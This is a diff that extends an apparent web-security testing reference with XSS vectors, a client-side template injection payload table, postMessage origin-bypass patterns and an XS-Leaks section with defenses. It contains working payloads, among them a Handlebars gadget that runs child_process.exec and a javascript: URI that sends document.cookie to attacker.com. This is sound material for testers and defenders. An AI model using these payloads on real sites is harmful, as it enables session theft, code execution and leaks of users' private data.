@@ -10,7 +10,12 @@
 - CSP bypass vectors: `unsafe-inline`, `unsafe-eval`, `data:` URI, JSONP endpoints on whitelisted domains, `base-uri` missing (base tag injection), Angular/Vue template injection within CSP, CDN-hosted libraries with known gadgets, `object-src` to Flash/PDF, `script-src` with wildcard subdomains
 - Mutation XSS (mXSS): browser HTML parser mutations turning safe markup into executable code (DOMPurify bypasses, namespace confusion)
 - XSS in PDF generators (wkhtmltopdf, Puppeteer — `<script>`, `<iframe>`, SSRF+XSS), email templates (HTML injection), markdown renderers (link/image injection, HTML passthrough)
-- Blind XSS: payload fires later in admin panel, logging dashboard, support ticket system, error monitoring tool
+- Blind XSS: payload fires later in admin panel, logging dashboard, support ticket system, error monitoring tool; also via HTTP headers (Referer, User-Agent, X-Forwarded-For) and contact/feedback forms logged server-side
+- mXSS via `<noscript>`: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` — parser re-enters HTML mode inside noscript when scripting disabled, turning safe attribute into executable markup
+- XSS in hidden input via accesskey: `<input type="hidden" accesskey="X" onclick="alert(1)">` — requires Alt+Shift+X (Firefox) or Alt+X (Chrome) by victim, useful when CSP blocks other vectors
+- `javascript:` URI in bot/automation flows: `javascript:fetch('//attacker.com/?c='+document.cookie)` — when Playwright, Selenium, or Puppeteer navigates to user-supplied URLs without scheme validation
+- `window.name` as persistent XSS source: `window.name` persists across cross-origin navigations; if target page uses `innerHTML = name` (without `var name` declaration), attacker pre-sets it on a controlled page before redirecting victim
+- `fetchLater` API: new browser API for deferred beacon-style requests; CSRF possible if endpoints accept it without CSRF tokens, since request fires after page unloads bypassing standard CSRF defenses
 - XSS via SVG upload: `<svg onload="alert(1)">`, `<svg><script>alert(1)</script></svg>`
 - XSS via content-type sniffing: missing `X-Content-Type-Options: nosniff` allows browser to interpret response as HTML
 - XSS via service workers: registering a malicious service worker from XSS for persistence
@@ -155,6 +160,48 @@ Timelion label prototype → NODE_OPTIONS env var: `.es(*).props(label.__proto__
 
 ---
 
+## Client-Side Template Injection (CSTI)
+
+Client-side JS frameworks that evaluate expressions in user-controlled content:
+
+| Framework | Payload | Notes |
+|-----------|---------|-------|
+| AngularJS 1.x | `{{constructor.constructor('alert(1)')()}}` | Sandbox removed in 1.6+ |
+| AngularJS 1.x (sandbox escape) | `{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}` | Pre-1.6 |
+| Vue.js 2 | `{{_c.constructor('alert(1)')()}}` | Via `v-html` or template compilation |
+| Vue.js 3 | `{{$parent.$parent...$el.ownerDocument.defaultView.alert(1)}}` | Parent chain traversal |
+| Handlebars | `{{#with "s" as \|string\|}}{{#with "e"}}{{#with split as \|conslist\|}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as \|codelist\|}}{{this.push "return require('child_process').exec('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}` | Server-side Handlebars RCE |
+| Svelte | `{@html userInput}` | Explicit unsafe render directive |
+| Mithril.js | `m.trust(userInput)` | Marks HTML as trusted |
+
+Key distinction from XSS: CSTI exploits the template engine's expression evaluator, not HTML parsing. Payloads contain no `<script>` tags or event handlers — they use the framework's own interpolation syntax.
+
+Detection: look for double-curly-brace `{{}}` reflection in page source within Angular/Vue apps, or template compilation of user-controlled strings.
+
+---
+
+### postMessage Exploitation
+
+Vulnerable receiver patterns (missing origin validation):
+```javascript
+window.addEventListener('message', function(e) {
+  eval(e.data)                    // RCE
+  element.innerHTML = e.data      // DOM XSS
+  location.href = e.data          // open redirect
+  fetch(e.data.url)               // SSRF
+});
+```
+
+Origin validation bypasses:
+- `null` origin: triggered by `data:` URIs, sandboxed iframes (`<iframe sandbox="allow-scripts">`)
+- Regex bypass: `if (e.origin.match(/victim\.com/))` matches `victim.com.attacker.com`
+- Endswith bypass: `e.origin.endsWith('victim.com')` matches `evilxvictim.com`
+- Bidirectional: `e.source.postMessage()` for two-way exploitation
+
+Tools: Posta (Chrome extension), DOM Invader (Burp), manual DevTools: `getEventListeners(window)`.
+
+---
+
 ## CORS Misconfiguration
 
 - `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browser blocks this, but misconfigured reflection doesn't)
@@ -270,3 +317,58 @@ Browser only fetches font if target contains matching characters.
 - `style-src 'unsafe-inline'` (extremely common) enables inline injection
 - `:has()` technique works entirely within existing page styles
 - No JavaScript execution needed for any CSS exfiltration technique
+
+---
+
+## XS-Leaks (Cross-Site Information Leaks)
+
+Cross-site information leakage without XSS — a distinct attack class exploiting observable side effects of cross-origin requests.
+
+### Timing and State Channels
+
+**Cache timing:**
+- Resource cache probing: request a cross-origin resource, measure load time — cached (fast) vs. not cached (slow) reveals prior visit
+- Frame counting: `window.frames.length` differs based on authenticated vs. unauthenticated response content
+
+**Error event differential:**
+- `onload` vs. `onerror` on `<img>`, `<script>`, `<link>`: status code (200 vs. 403/404) leaks authentication state
+- Cross-origin fetch redirects observable via final URL vs. error
+
+**History probing:**
+- `performance.getEntriesByName(url)` reveals whether browser fetched a resource
+- CSS `:visited` colour difference measurable via `getComputedStyle` in some engines
+
+**Navigation state:**
+- `window.opener.frames` counting detects navigation state changes in popups
+- `window.length` (frame count) changes as authenticated content loads iframes
+
+### Spectre-Class Channels
+- `SharedArrayBuffer` + `Atomics.wait` for high-resolution timing (requires COOP/COEP headers)
+- CSS paint timing leaks via `PerformancePaintTiming` API on cross-origin frames
+- `requestAnimationFrame` timing differential for CPU-intensive cross-origin renders
+
+### Header-Based Leaks
+- `Sec-Fetch-Site` header value inference: server behaviour differences based on same-site vs. cross-site fetch are observable
+- CORS preflight outcome leaks endpoint existence (connection refused vs. 404 vs. CORS header present)
+
+### Broadcast Channel Probing
+- `BroadcastChannel` API: attacker page joins named channel, observes messages if victim page posts state updates
+- Shared worker connections observable by message timing
+
+### COOP Interactions
+- Pages without `Cross-Origin-Opener-Policy` retain `window.opener` reference — attacker can poll `opener.location`, `opener.frames`
+- Pages with `COOP: same-origin` break opener reference — observable as side channel (breaks attacker's probe)
+
+### Impact
+- Detect authentication state (logged in vs. logged out)
+- Enumerate private resources (does `/admin/report/123` exist?)
+- Extract user data cross-origin via repeated oracle queries
+- De-anonymise users by probing personalized resource URLs
+
+### Defenses
+- `Cross-Origin-Opener-Policy: same-origin` — breaks window reference leaks
+- `Cross-Origin-Embedder-Policy: require-corp` — required for SharedArrayBuffer
+- Proper cache partitioning (Chrome 86+, Firefox 85+ partition caches per top-level origin)
+- `SameSite=Lax/Strict` cookies — prevents cross-site requests from carrying credentials
+- Constant-time responses regardless of authentication state
+- `Vary: Cookie` with `Cache-Control: private` on authenticated resources
